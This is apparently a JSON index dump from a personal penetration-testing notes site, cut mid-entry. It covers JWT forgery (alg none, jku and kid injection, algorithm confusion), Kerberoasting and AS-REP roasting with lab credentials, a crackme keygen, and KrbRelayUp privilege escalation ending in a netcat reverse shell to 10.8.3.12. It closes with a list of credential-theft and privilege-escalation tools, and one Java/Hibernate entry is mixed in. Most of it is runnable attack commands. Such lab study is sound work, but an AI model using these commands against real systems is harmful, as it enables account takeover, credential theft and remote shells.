sessionFactory = configuration.buildSessionFactory(); Session session = sessionFactory.openSession(); // Perform database operations using Hibernate // Close resources session.close(); sessionFactory.close(); } }\rNoSQL Databases In addition to relational databases, Java supports NoSQL databases like MongoDB, Cassandra, and Redis. For these databases, you can use Java libraries and drivers specific to each database.\n","date":"2023-09-07","id":60,"permalink":"/notes/code/java/","summary":"\u003ch2 id=\"1--basic-java-syntax\"\u003e1.  Basic Java Syntax\u003c/h2\u003e\n\u003ch3 id=\"structure-of-a-java-program\"\u003eStructure of a Java Program\u003c/h3\u003e\n\u003cp\u003eA Java program is structured around classes. Every Java program starts with at least one class, and there must be a \u003ccode\u003emain\u003c/code\u003e method in one of these classes. The \u003ccode\u003emain\u003c/code\u003e method is the entry point for the program\u0026rsquo;s execution.\u003c/p\u003e","tags":[],"title":"Java"},{"content":" Tools: https://jwt.io/ Exploiting flawed JWT signature verification :\n{ \u0026#34;username\u0026#34;: \u0026#34;carlos\u0026#34;, \u0026#34;isAdmin\u0026#34;: false }\rto\n{ \u0026#34;username\u0026#34;: \u0026#34;administrator\u0026#34;, \u0026#34;isAdmin\u0026#34;: true }\rJWT authentication bypass via flawed signature verification :\nChange the alg value to none : You can use the options attack none in the jwt editor extension\nBrute-forcing secret keys\nhashcat -a 0 -m 16500 \u0026lt;jwt\u0026gt; \u0026lt;wordlist\u0026gt;\rIt's the whole jwt Injecting self-signed JWTs via the jwk parameter\nWe automatically generate a new RSA key pair\nAttack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK.\nDon't forget to modify the desire parameter\nJWT authentication bypass via jku header injection\nTool : https://beeceptor.com/mock-api/\nGenerate a new RSA key\nCopy public key as JWK : into your exploit server :\n{ \u0026#34;keys\u0026#34;:[ ] }\rIn the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.\nAdd a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.\nIn the payload, change the value of the sub claim to administrator.\nAt the bottom of the tab, click Sign, then select the RSA key that you generated in the previous section.\nMake sure that the Don\u0026rsquo;t modify header option is selected, then click OK. The modified token is now signed with the correct signature.\nJWT authentication bypass via kid header path traversal\nCreate a New Symmetric key Null bytes encoded in base64 for k parameter :\nThen change the kid value :\n../../../../../../../../dev/null\rMake sure to try every possible lfi for the kid like double encoding etc . And don't forget to sign the key JWT authentication bypass via algorithm confusion\nLooks for /jwks.json or /.well-known/jwks.json file .\nCopy the key from the json file to the new RSA key , let the JWK parameter. Click ok and right click on the key then copy the key as PEM .\nConvert the key in base64 with the decoder :\nCreate a new symmetric key and replace the k value this base64 of the key :\nChange the alg RS256 to HS256 and the sub to administrator and sign it .\nJWT authentication bypass via algorithm confusion with no exposed key\nCopy two valid JWT somewhere then use this command : #Install before docker docker run --rm -it portswigger/sig2n \u0026lt;token1\u0026gt; \u0026lt;token2\u0026gt;\rTry to send the two Tampered JWT the good one has 200 response not the 301 and 302\nTake the base64 encoded key of the good one then generate a new symmetric key and replace the k value with the encoded key .\nThen use the 200 response JWT , sign it and modify the sub .\nIn the header of the JWT, make sure that the alg parameter is set to HS256\n","date":"2023-09-07","id":61,"permalink":"/notes/web/jwt/","summary":"\u003cul\u003e\n\u003cli\u003eTools:\nhttps://jwt.io/\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eExploiting flawed JWT signature verification\u003c/strong\u003e :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;carlos\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;isAdmin\u0026#34;\u003c/span\u003e: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eto\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;administrator\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;isAdmin\u0026#34;\u003c/span\u003e: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eJWT authentication bypass via flawed signature verification\u003c/strong\u003e :\u003c/p\u003e","tags":[],"title":"JWT"},{"content":"Kerberoasting :\nGetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t GetUserSPNs.py -outputfile kerberoastables.txt -hashes \u0026#39;LMhash:NThash\u0026#39; -dc-ip $KeyDistributionCenter \u0026#39;DOMAIN/USER\u0026#39; netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter GetUserSPNs.py -no-preauth \u0026#34;Asreproastable_User\u0026#34; -usersfile \u0026#34;LIST_USERS\u0026#34; -dc-host \u0026#34;dc.domain.local\u0026#34; \u0026#34;domain.local\u0026#34;/ #No_preauth_user=Kerberoastable user proxychains -q nxc ldap 10.10.168.101 -u svc-web-accounting-d -p \u0026#39;H3r0n2024#!\u0026#39; --kerberoasting output.txt\rjohn --format=krb5tgs --wordlist= /usr/share/wordlists/rockyou.txt hash hashcat -m 13100 kerberoastables.txt $wordlist\rAsreproast :\nUsers list dynamically queried with an LDAP anonymous bind GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter \u0026#39;DOMAIN/\u0026#39;\rWith a users file GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter \u0026#39;DOMAIN/\u0026#39;\rUsers list dynamically queried with a LDAP authenticated bind (password) GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter \u0026#39;DOMAIN/USER:Password\u0026#39;\rUsers list dynamically queried with a LDAP authenticated bind (NT hash) GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes \u0026#39;LMhash:NThash\u0026#39; -dc-ip $KeyDistributionCenter \u0026#39;DOMAIN/USER\u0026#39;\rNetexec netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter\rCrack hashcat -m 18200 -a 0 ASREProastables.txt $wordlist john --wordlist=$wordlist ASREProastables.txt\rMitM: # Proxy between the clients and the DC, forcing RC4 downgrade if supported ASRepCatcher relay -dc $DC_IP # Disables ARP spoofing (the MitM must be obtained with other means) ASRepCatcher relay -dc $DC_IP --disable-spoofing # Passively listen for AS-REP packets, no packet alteration ASRepCatcher listen\r","date":"2023-09-07","id":62,"permalink":"/notes/ad/kerberoast-asreproast/","summary":"\u003cp\u003e\u003cstrong\u003eKerberoasting :\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetUserSPNs.py -outputfile kerberoastables.txt -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e -dc-ip \u003cspan class=\"nv\"\u003e$KeyDistributionCenter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec ldap \u003cspan class=\"nv\"\u003e$TARGETS\u003c/span\u003e -u \u003cspan class=\"nv\"\u003e$USER\u003c/span\u003e -p \u003cspan class=\"nv\"\u003e$PASSWORD\u003c/span\u003e --kerberoasting kerberoastables.txt --kdcHost \u003cspan class=\"nv\"\u003e$KeyDistributionCenter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetUserSPNs.py -no-preauth \u003cspan class=\"s2\"\u003e\u0026#34;Asreproastable_User\u0026#34;\u003c/span\u003e -usersfile \u003cspan class=\"s2\"\u003e\u0026#34;LIST_USERS\u0026#34;\u003c/span\u003e -dc-host \u003cspan class=\"s2\"\u003e\u0026#34;dc.domain.local\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;domain.local\u0026#34;\u003c/span\u003e/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#No_preauth_user=Kerberoastable user\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxychains -q nxc ldap 10.10.168.101 -u svc-web-accounting-d -p \u003cspan class=\"s1\"\u003e\u0026#39;H3r0n2024#!\u0026#39;\u003c/span\u003e --kerberoasting output.txt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejohn --format\u003cspan class=\"o\"\u003e=\u003c/span\u003ekrb5tgs --wordlist\u003cspan class=\"o\"\u003e=\u003c/span\u003e /usr/share/wordlists/rockyou.txt \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehashcat -m \u003cspan class=\"m\"\u003e13100\u003c/span\u003e kerberoastables.txt \u003cspan class=\"nv\"\u003e$wordlist\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eAsreproast :\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Kerberoast-Asreproast"},{"content":" Function : _start: main function sub_400135: Calculates the length of the input sub_400146: Performs certain operations: \u0026ndash;\u0026gt; Takes each character of our input - i + 0x14 \u0026ndash;\u0026gt; Then compares it to the file .m.key\nExploit: python3 -c \u0026#34;import sys; sys.stdout.buffer.write(b\u0026#39;\\x86\\x82\\x81\\x85\\x3d\\x7c\\x73\\x3b\\x7b\\x7d\\x71\u0026#39;)\u0026#34; \u0026gt; .m.key\rImportant Breakpoints : break *0x0040014f break *0x00400166\rPython Code : import hashlib login = input(\u0026#34;Type your username:\\n \u0026#34;) charset = list(login.encode(\u0026#39;utf-8\u0026#39;)) i = 0 for idx, char in enumerate(charset): charset[idx] = char + 0x14 - i i += 1 print(charset) hashed_bytes = hashlib.sha256(bytes(charset)).hexdigest() print(\u0026#34;Hash SHA-256 of the transformed bytes:\u0026#34;, hashed_bytes)\r","date":"2023-09-07","id":63,"permalink":"/notes/pwn-reverse/chall/keygen-me/","summary":"\u003cul\u003e\n\u003cli\u003eFunction :\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e_start:  main function\nsub_400135: Calculates the length of the input\nsub_400146: Performs certain operations:\n\u0026ndash;\u0026gt; Takes each character of our input - i + 0x14\n\u0026ndash;\u0026gt; Then compares it to the file .m.key\u003c/p\u003e","tags":[],"title":"Keygen-Me"},{"content":" Tool : https://github.com/Dec0ne/KrbRelayUp\nCheck if exploitable :\nnetexec ldap brunodc.bruno.vl -u \u0026#34;svc_scan\u0026#34; -p \u0026#34;Sunshine1\u0026#34; -M ldap-checker # LDAP Signing NOT Enforced! netexec ldap brunodc.bruno.vl -u \u0026#34;svc_scan\u0026#34; -p \u0026#34;Sunshine1\u0026#34; -M maq #MachineAccountQuota: 10\rExploit with a tool : .\\KrbRelayUp.exe relay brunodc.bruno.vl -CreateNewComputerAccount -ComputerName pwned$ -ComputerPassword P@ssword1234 -cls \u0026lt;CLS\u0026gt;\r./KrbRelayUp spawn -m rbcd --DomainController brunodc.bruno.vl -cn pwned$ -cp P@ssword1234 --sc \u0026#34;C:\\Users\\svc_scan\\Documents\\nc.exe 10.8.3.12 4242 -e cmd\u0026#34;\rFind a CLSID for a specific OS (as admin on a comparable machine to your target): https://github.com/tyranid/oleviewdotnet Import-Module .\\OleViewDotNet.psd1 Get-ComDatabase -SetCurrent $comdb = Get-CurrentComDatabase $clsids = (Get-ComClass).clsid Get-ComProcess -DbgHelpPath \u0026#39;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbghelp.dll\u0026#39; CLSIDs (confirmed working on Server 2019/2022 with ADCS installed):\nc980e4c2-c178-4572-935d-a8a429884806\n90f18417-f0f1-484e-9d3c-59dceee5dbd8\n03ca98d6-ff5d-49b8-abc6-03dd84127020\nd99e6e73-fc88-11d0-b498-00a0c90312f3 (certsrv.exe)\n42cbfaa7-a4a7-47bb-b422-bd10e9d02700\n000c101c-0000-0000-c000-000000000046\n1b48339c-d15e-45f3-ad55-a851cb66be6b\n49e6370b-ab71-40ab-92f4-b009593e4518\n50d185b9-fff3-4656-92c7-e4018da4361d\n3c6859ce-230b-48a4-be6c-932c0c202048 (trusted installer service)\nRessource: https://vulndev.io/cheats-windows/\n","date":"2023-09-07","id":64,"permalink":"/notes/ad/krbrelaiup/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTool : https://github.com/Dec0ne/KrbRelayUp\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCheck if exploitable :\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec ldap brunodc.bruno.vl -u \u003cspan class=\"s2\"\u003e\u0026#34;svc_scan\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;Sunshine1\u0026#34;\u003c/span\u003e -M ldap-checker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# LDAP Signing NOT Enforced!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec ldap brunodc.bruno.vl -u \u003cspan class=\"s2\"\u003e\u0026#34;svc_scan\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;Sunshine1\u0026#34;\u003c/span\u003e -M maq\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#MachineAccountQuota: 10\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExploit with a tool :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e.\\\u003c/span\u003e\u003cspan class=\"n\"\u003eKrbRelayUp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eexe\u003c/span\u003e \u003cspan class=\"n\"\u003erelay\u003c/span\u003e \u003cspan class=\"n\"\u003ebrunodc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ebruno\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003evl\u003c/span\u003e \u003cspan class=\"n\"\u003e-CreateNewComputerAccount\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"n\"\u003epwned\u003c/span\u003e\u003cspan class=\"p\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerPassword\u003c/span\u003e \u003cspan class=\"n\"\u003eP\u003c/span\u003e\u003cspan class=\"nv\"\u003e@ssword1234\u003c/span\u003e \u003cspan class=\"n\"\u003e-cls\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003eCLS\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e./\u003c/span\u003e\u003cspan class=\"n\"\u003eKrbRelayUp\u003c/span\u003e \u003cspan class=\"n\"\u003espawn\u003c/span\u003e \u003cspan class=\"n\"\u003e-m\u003c/span\u003e \u003cspan class=\"n\"\u003erbcd\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003e-DomainController\u003c/span\u003e \u003cspan class=\"n\"\u003ebrunodc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ebruno\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003evl\u003c/span\u003e \u003cspan class=\"n\"\u003e-cn\u003c/span\u003e \u003cspan class=\"n\"\u003epwned\u003c/span\u003e\u003cspan class=\"p\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003e-cp\u003c/span\u003e \u003cspan class=\"n\"\u003eP\u003c/span\u003e\u003cspan class=\"nv\"\u003e@ssword1234\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003e-sc\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;C:\\Users\\svc_scan\\Documents\\nc.exe 10.8.3.12 4242 -e cmd\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eFind a CLSID for a specific OS (as admin on a comparable machine to your target):\nhttps://github.com/tyranid/oleviewdotnet\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eImport-Module .\u003cspan class=\"se\"\u003e\\O\u003c/span\u003eleViewDotNet.psd1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGet-ComDatabase -SetCurrent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$comdb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Get-CurrentComDatabase\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$clsids\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eGet-ComClass\u003cspan class=\"o\"\u003e)\u003c/span\u003e.clsid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGet-ComProcess -DbgHelpPath \u003cspan class=\"s1\"\u003e\u0026#39;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbghelp.dll\u0026#39;\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eCLSIDs\u003c/strong\u003e (confirmed working on Server 2019/2022 with ADCS installed):\u003c/p\u003e","tags":[],"title":"KrbRelaiUp"},{"content":"\rsudo virsh net-start default\r","date":"2023-09-07","id":65,"permalink":"/notes/ressources/kvm/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo virsh net-start default\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Kvm"},{"content":"#ldap Using this you will be able to see the public information (like the domain name):\nnmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; \u0026lt;IP\u0026gt; #Using anonymous credentials\rCheck null credentials or if your credentials are valid:\nldapsearch -x -H ldap://\u0026lt;IP\u0026gt; -D \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=\u0026lt;1_SUBDOMAIN\u0026gt;,DC=\u0026lt;TLD\u0026gt;\u0026#34; ldapsearch -x -H ldap://\u0026lt;IP\u0026gt; -D \u0026#39;\u0026lt;DOMAIN\u0026gt;\\\u0026lt;username\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;password\u0026gt;\u0026#39; -b \u0026#34;DC=\u0026lt;1_SUBDOMAIN\u0026gt;,DC=\u0026lt;TLD\u0026gt;\u0026#34;\r","date":"2023-09-07","id":66,"permalink":"/notes/services/ldap/","summary":"\u003cp\u003e#ldap\nUsing this you will be able to see the \u003cstrong\u003epublic information\u003c/strong\u003e (like the domain name)\u003cstrong\u003e:\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -n -sV --script \u003cspan class=\"s2\"\u003e\u0026#34;ldap* and not brute\u0026#34;\u003c/span\u003e \u0026lt;IP\u0026gt; \u003cspan class=\"c1\"\u003e#Using anonymous credentials\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eCheck null credentials or if your credentials are valid:\u003c/p\u003e","tags":[],"title":"Ldap"},{"content":"Cheat sheet AD : https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\nCVE-Website: https://www.cvedetails.com/\nCustom password : https://github.com/Mebus/cupp\nCustom Username Wordlist : https://github.com/urbanadventurer/username-anarchy.git\nCustom password : https://github.com/digininja/CeWL\nSetuid and setgid : https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits\nSUID : https://gtfobins.github.io/\nDump the network : https://github.com/DanMcInerney/net-creds.git\nPrivesc tool : https://github.com/CISOfy/lynis\nSeatbelt and SharpUp https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\nLaZagne: https://github.com/AlessandroZ/LaZagne/releases/\nTool Description Seatbelt C# project for performing a wide variety of local privilege escalation checks winPEAS WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here PowerUp PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found SharpUp C# version of PowerUp JAWS PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 SessionGopher SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information Watson Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. LaZagne Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more Windows Exploit Suggester - Next Generation WES-NG is a tool based on the output of Windows\u0026rsquo; systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported https://www.leeholmes.com/adjusting-token-privileges-in-powershell/ https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1 